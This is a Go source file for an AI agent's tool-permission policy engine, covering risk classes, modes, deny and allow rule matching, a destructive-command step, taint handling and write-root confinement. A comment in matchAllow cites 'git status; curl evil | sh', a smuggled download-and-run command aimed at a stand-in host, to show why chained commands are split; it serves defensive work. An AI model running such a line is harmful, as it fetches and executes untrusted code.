package domain

import (
	"path/filepath"
	"strings"
)

// Risk is a tool's risk class (Tech Design §5.3).
type Risk string

// Risk classes.
const (
	RiskReadOnly Risk = "ReadOnly"
	RiskWriteFS  Risk = "WriteFS"
	RiskExec     Risk = "Exec"
	RiskNetwork  Risk = "Network"
)

// Mode is a thread's permission mode, as `threads.mode` stores it.
type Mode string

// Thread modes.
const (
	ModeAsk      Mode = "ask"
	ModeNormal   Mode = "normal"
	ModeAutoEdit Mode = "auto-edit"
)

// Verdict is what the policy engine decides.
type Verdict string

// Verdicts.
const (
	VerdictAllow Verdict = "allow"
	VerdictAsk   Verdict = "ask"
	VerdictDeny  Verdict = "deny"
)

// Step is one rung of DD-006's precedence, named as policy.explain's trace names it
// (API Spec §5.36).
type Step string

// Steps, highest precedence first. StepExposure precedes DD-006's six (delta
// `2026-09-policy-precedence`).
const (
	StepExposure    Step = "exposure"
	StepDestructive Step = "destructive_pattern"
	StepDenyRules   Step = "deny_rules"
	StepTaint       Step = "taint"
	StepMode        Step = "mode"
	StepAllowRules  Step = "allow_rules"
	StepModeDefault Step = "mode_default"
)

// Reasons a decision carries. The ones an `ask` gives are `approvals.reason`'s values (Data
// Model §2.8); the two a `deny` gives never reach that table.
const (
	ReasonPolicy           = "policy"
	ReasonDestructive      = "destructive"
	ReasonTainted          = "tainted"
	ReasonOutsideWriteRoot = "outside_write_root"
	ReasonDenyRule         = "deny_rule"
	ReasonNotExposed       = "not_exposed"
)

// Rule sources, as `policy_rules.source` stores them.
const (
	RuleSourceUser   = "user_decision"
	RuleSourceConfig = "config"
)

// Action is a tool call the agent wants to make.
type Action struct {
	ThreadID string
	Tool     string
	Risk     Risk
	// Target is what the rules' patterns match: the command line for Exec, the path for
	// WriteFS and ReadOnly file tools, the URL for Network.
	Target string
	// Cwd resolves a relative WriteFS target; empty means WriteRoot.
	Cwd string
	// WriteRoot is the thread's write boundary (see WriteRoot); empty means none.
	WriteRoot string
}

// Rule is a persisted decision or a configured one (`policy_rules`, Data Model §2.9).
type Rule struct {
	// ThreadID scopes the rule to one thread; empty is global (`always`).
	ThreadID string
	// Tool is a glob over tool names: "run_command", "mcp_gitlab_*".
	Tool string
	// Pattern is a glob over the action's target; empty is "*".
	Pattern  string
	Decision Verdict
	Source   string
}

// TraceStep is one step as policy.explain reports it.
type TraceStep struct {
	Step    Step
	Matched bool
	// Decided marks the step whose verdict stands; exactly one step has it.
	Decided bool
	// Detail names what matched: the destructive pattern, the rule, the mode.
	Detail string
	// Note says why a step that matched did not decide.
	Note string
}

// Decision is Decide's answer.
type Decision struct {
	Verdict Verdict
	// Reason says why; empty for an allow.
	Reason string
	// Step is the one that decided.
	Step Step
	// AllowAlways is false where an approval may not be remembered as `always`: a destructive
	// command asks every time (Tech Design §5.3, "ignores always").
	AllowAlways bool
	// Trace is every step, in order, each evaluated whether or not an earlier one decided,
	// as policy.explain shows it (API Spec §5.36).
	Trace []TraceStep
}

// Exposed reports whether a mode shows the model a tool of this risk at all: `ask` shows only
// ReadOnly tools (REQ-AGT-009), the other modes show everything and decide per call. An
// unknown mode exposes nothing.
func Exposed(mode Mode, risk Risk) bool {
	switch mode {
	case ModeAsk:
		return risk == RiskReadOnly
	case ModeNormal, ModeAutoEdit:
		return true
	default:
		return false
	}
}

// Decide applies DD-006 with the built-in destructive patterns. It has no I/O: the rules, the
// write root and the taint are the caller's.
func Decide(action Action, mode Mode, rules []Rule, tainted bool) Decision {
	return Policy{Destructive: DefaultDestructivePatterns}.Decide(action, mode, rules, tainted)
}

// Policy is the engine with its destructive-pattern list, which a rule bundle can replace
// (REQ-SEC-010).
type Policy struct {
	Destructive []DestructivePattern
}

// Decide applies delta `2026-09-policy-precedence` over DD-006, highest first:
//
//  0. exposure: a tool the mode does not show the model is denied as `not_exposed` —
//     `ask` shows ReadOnly only (REQ-AGT-009), and an unknown mode shows nothing;
//  1. a destructive command asks, never as `always` (REQ-SEC-005) — a floor, not a ceiling:
//     a matching `deny` rule still denies it;
//  2. a matching `deny` rule denies;
//  3. taint asks for Exec and Network (REQ-SEC-006);
//  4. the mode: `auto-edit` allows WriteFS inside the write root and asks with
//     `outside_write_root` outside it, whatever the `allow` rules say (REQ-AGT-013);
//  5. a matching `allow` rule allows (REQ-AGT-014);
//  6. the mode default: ReadOnly is allowed, anything else asks.
//
// Every step is evaluated and traced; the first that matched decides, except that a deny
// rule outranks a destructive pattern.
func (p Policy) Decide(action Action, mode Mode, rules []Rule, tainted bool) Decision {
	trace := make([]TraceStep, 0, 7)
	add := func(step Step, matched bool, detail string) *TraceStep {
		trace = append(trace, TraceStep{Step: step, Matched: matched, Detail: detail})
		return &trace[len(trace)-1]
	}

	exposed := Exposed(mode, action.Risk)
	if exposed {
		add(StepExposure, false, "")
	} else {
		add(StepExposure, true, "mode "+string(mode)+" does not expose "+string(action.Risk))
	}

	destructive, isDestructive := "", false
	if action.Risk == RiskExec {
		destructive, isDestructive = MatchDestructive(p.Destructive, action.Target)
	}
	add(StepDestructive, isDestructive, destructive)

	deny, isDenied := matchDeny(rules, action)
	add(StepDenyRules, isDenied, ruleDetail(deny))

	isTainted := tainted && (action.Risk == RiskExec || action.Risk == RiskNetwork)
	add(StepTaint, isTainted, taintDetail(isTainted))

	modeDecides := mode == ModeAutoEdit && action.Risk == RiskWriteFS
	inside := modeDecides && withinWriteRoot(action)
	add(StepMode, modeDecides, string(mode))

	allow, isAllowed := matchAllow(rules, action)
	add(StepAllowRules, isAllowed, ruleDetail(allow))

	add(StepModeDefault, true, string(mode))

	d := Decision{AllowAlways: !isDestructive, Trace: trace}
	decide := func(step Step, verdict Verdict, reason string) Decision {
		d.Step, d.Verdict, d.Reason = step, verdict, reason
		for i := range d.Trace {
			switch {
			case d.Trace[i].Step == step:
				d.Trace[i].Decided = true
			case d.Trace[i].Matched && d.Trace[i].Step != StepModeDefault:
				d.Trace[i].Note = "overridden by " + string(step)
			}
		}
		return d
	}

	switch {
	case !exposed:
		return decide(StepExposure, VerdictDeny, ReasonNotExposed)
	case isDenied:
		return decide(StepDenyRules, VerdictDeny, ReasonDenyRule)
	case isDestructive:
		return decide(StepDestructive, VerdictAsk, ReasonDestructive)
	case isTainted:
		return decide(StepTaint, VerdictAsk, ReasonTainted)
	case modeDecides && inside:
		return decide(StepMode, VerdictAllow, "")
	case modeDecides:
		return decide(StepMode, VerdictAsk, ReasonOutsideWriteRoot)
	case isAllowed:
		return decide(StepAllowRules, VerdictAllow, "")
	case action.Risk == RiskReadOnly:
		return decide(StepModeDefault, VerdictAllow, "")
	default:
		return decide(StepModeDefault, VerdictAsk, ReasonPolicy)
	}
}

func taintDetail(tainted bool) string {
	if tainted {
		return "the turn holds untrusted content"
	}
	return ""
}

func ruleDetail(r *Rule) string {
	if r == nil {
		return ""
	}
	return r.Tool + " " + pattern(*r)
}

func pattern(r Rule) string {
	if r.Pattern == "" {
		return "*"
	}
	return r.Pattern
}

// matchDeny finds a deny rule that applies. For an Exec action a deny rule matches when its
// pattern matches the whole line or any one command of it, so `rm *` catches `echo hi; rm x`.
func matchDeny(rules []Rule, action Action) (*Rule, bool) {
	for i, r := range rules {
		if r.Decision != VerdictDeny || !ruleApplies(r, action) {
			continue
		}
		if glob(pattern(r), action.Target) {
			return &rules[i], true
		}
		if action.Risk == RiskExec {
			for _, part := range commandParts(action.Target) {
				if glob(pattern(r), part) {
					return &rules[i], true
				}
			}
		}
	}
	return nil, false
}

// matchAllow finds an allow rule that applies. For an Exec action every command of the line
// must be allowed — by this rule or another — so `git status*` does not carry
// `git status; curl evil | sh` with it; the rule reported is the one that allowed the first.
func matchAllow(rules []Rule, action Action) (*Rule, bool) {
	parts := []string{action.Target}
	if action.Risk == RiskExec {
		parts = commandParts(action.Target)
	}
	if len(parts) == 0 {
		// A line with no command is not something a rule can have allowed; it asks.
		return nil, false
	}
	var first *Rule
	for _, part := range parts {
		found := false
		for i, r := range rules {
			if r.Decision == VerdictAllow && ruleApplies(r, action) && glob(pattern(r), part) {
				if first == nil {
					first = &rules[i]
				}
				found = true
				break
			}
		}
		if !found {
			return nil, false
		}
	}
	return first, true
}

// ruleApplies checks the rule's scope and tool: global or the action's thread, and its tool
// glob matching the tool.
func ruleApplies(r Rule, action Action) bool {
	return (r.ThreadID == "" || r.ThreadID == action.ThreadID) && glob(r.Tool, action.Tool)
}

// WriteRoot is the agent's write boundary for a cwd: the nearest directory at or above it
// that isRepo says is a repository root, or the cwd itself (Tech Design §5.3). isRepo is the
// caller's I/O (a `.git` entry), which keeps this pure. An empty cwd has no write root.
func WriteRoot(cwd string, isRepo func(dir string) bool) string {
	if cwd == "" {
		return ""
	}
	start := filepath.Clean(cwd)
	for dir := start; ; dir = filepath.Dir(dir) {
		if isRepo(dir) {
			return dir
		}
		if filepath.Dir(dir) == dir {
			return start
		}
	}
}

// withinWriteRoot resolves the target against the cwd (or the root) lexically and reports
// whether it stays inside the root. Symlinks are the caller's to resolve before asking: this
// sees paths only.
func withinWriteRoot(a Action) bool {
	if a.WriteRoot == "" {
		return false
	}
	root := filepath.Clean(a.WriteRoot)
	target := a.Target
	if !filepath.IsAbs(target) {
		base := a.Cwd
		if base == "" {
			base = root
		}
		target = filepath.Join(base, target)
	}
	rel, err := filepath.Rel(root, filepath.Clean(target))
	if err != nil {
		return false
	}
	return rel == "." || (rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)))
}

// glob matches s against a pattern where `*` is any run of characters (slashes included) and
// `?` is any one. Rules match command lines and paths alike, so `/` is not special.
func glob(pattern, s string) bool {
	p, str := []rune(pattern), []rune(s)
	pi, si := 0, 0
	star, mark := -1, 0
	for si < len(str) {
		switch {
		case pi < len(p) && (p[pi] == '?' || p[pi] == str[si]):
			pi++
			si++
		case pi < len(p) && p[pi] == '*':
			star, mark = pi, si
			pi++
		case star >= 0:
			pi = star + 1
			mark++
			si = mark
		default:
			return false
		}
	}
	for pi < len(p) && p[pi] == '*' {
		pi++
	}
	return pi == len(p)
}
